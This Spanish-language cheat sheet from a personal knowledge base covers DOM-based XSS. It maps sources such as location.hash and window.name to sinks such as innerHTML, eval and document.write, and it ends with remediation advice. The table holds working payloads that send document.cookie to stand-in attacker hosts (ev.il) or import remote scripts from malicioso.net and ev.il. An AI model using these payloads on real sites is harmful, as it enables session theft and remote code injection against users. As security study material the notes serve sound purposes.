---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Manipulación de Sources y Sinks (DOM-based)

***

## Cheatsheet
| **Categoría** | **Source / Sink**                  | **Payload de Ejemplo**                                          | **Escenario de Explotación y Contexto**                                                                                                                                           |
| ------------- | ---------------------------------- | --------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Source**    | `location.hash`                    | `#<svg/onload=import('//malicioso.net/x.js')>`                  | Se explota cuando el frontend (ej. frameworks SPA) renderiza el fragmento dinámicamente sin validación. Al no enviarse al servidor web, evade auditorías de WAF perimetrales.     |
| **Source**    | `location.search`                  | `?redirect=javascript:fetch('//ev.il/?c='+document.cookie)`     | Ideal para vulnerabilidades de redirección abierta en el cliente (ej. cuando la app hace `window.location = urlParams.get('redirect')`).                                          |
| **Source**    | `window.name`                      | `window.name="eval(atob('...'))"; location='http://target.com'` | Permite inyectar payloads masivos (hasta 2MB) de forma silenciosa. El atacante setea la variable en su dominio y redirige a la víctima hacia el Sink vulnerable.                  |
| **Source**    | `document.referrer`                | Originado desde un sitio atacante con URL maliciosa.            | Explotado cuando la página vulnerable construye enlaces dinámicos (ej. un botón de "Volver atrás") inyectando esta propiedad directamente en un atributo `href`.                  |
| **Sink**      | `innerHTML` / `insertAdjacentHTML` | `<style onload=eval(name)>`                                     | Bypass de filtros básicos que bloquean etiquetas `<script>`. Al combinar la inyección con el Source `window.name`, se logra ejecución limpia sin saturar la URL con el payload.   |
| **Sink**      | `eval()` / `Function()`            | `\'-alert(1)//` o `");import('//ev.il/x.js');//`                | Escape de contexto dentro de bloques preexistentes. Si el input se concatena (ej. `eval("var usr = '"+input+"';")`), el payload rompe la asignación original y ejecuta el código. |
| **Sink**      | `setTimeout()` / `setInterval()`   | `1000); fetch('//ev.il/'+cookie); //`                           | Ocurre cuando se pasa una cadena en lugar de un _callback_ (ej. `setTimeout("log('"+input+"')", 1000)`). El payload cierra la función original y encadena la ejecución maliciosa. |
| **Sink**      | `document.write()`                 | `</script><script src="//ev.il/hook.js"></script>`              | Típico en integraciones legacy o Ad-Tech. Se requiere cerrar explícitamente el contexto del `<script>` actual para que el motor del navegador parsee e incruste el script remoto. |

### Flujo de Ejecución y Trazado de Variables

Para que la manipulación directa sea exitosa, debo rastrear el flujo de datos dentro de los scripts de la página. El ataque requiere conectar un Source con un Sink sin que exista una validación, sanitización o codificación intermedia adecuada.

- **Identificación del Source:** Consiste en localizar dónde la aplicación lee entradas de mi control directo. Por ejemplo, analizando el script para encontrar asignaciones como `var payload = window.location.hash.substring(1);`.
    
- **Confirmación del Sink:** Rastrear el uso de esa variable para ubicar el punto exacto donde se emplea en funciones críticas de renderizado o ejecución. Ejemplo: `document.getElementById("mensaje").innerHTML = payload;`.
    
- **Adaptación del Payload:** La naturaleza de la inyección depende estrictamente del Sink. Si el Sink procesa HTML (como `innerHTML`), inyecto etiquetas con manejadores de eventos, por ejemplo: `<img src=x onerror=alert(1)>`. Si el Sink espera y ejecuta JavaScript puro (como `eval()`), mi payload no necesita etiquetas, inyecto la sintaxis directa: `alert(1);`.
    

### Remediación y Sustitución de APIs

La mitigación del DOM XSS no se soluciona filtrando entradas en el servidor, sino adoptando prácticas de desarrollo defensivo en el frontend, alterando la forma en que el JavaScript manipula el DOM:

- **Implementación de Sinks Seguros:** Sustituir las asignaciones peligrosas como `innerHTML` o `outerHTML` por propiedades que interpretan el contenido estrictamente como texto sin formato, tales como `textContent` o `innerText`.
    
- **Eliminación de Ejecución Dinámica:** Suprimir el uso de funciones de evaluación en tiempo real (`eval()`, `Function()`, `setTimeout()` con parámetros de cadena) siempre que los datos provengan directa o indirectamente de la interacción del usuario.


___

## Overview

A diferencia de las variantes reflejadas y almacenadas, el [[XSS Basado en DOM]] (DOM XSS) ocurre enteramente en el lado del cliente (en el navegador). La vulnerabilidad no reside en cómo el servidor web procesa y devuelve el HTML, sino en cómo el código [[JavaScript]] legítimo de la aplicación recoge datos de una fuente controlable (Source) y los transfiere a una función o propiedad que ejecuta o renderiza ese contenido de forma insegura (Sink).

Esta característica arquitectónica hace que muchos ataques DOM XSS sean invisibles para los [[Web Application Firewall]] (WAF) tradicionales y para los registros de acceso del servidor, ya que el payload puro nunca abandona el entorno local de la víctima.
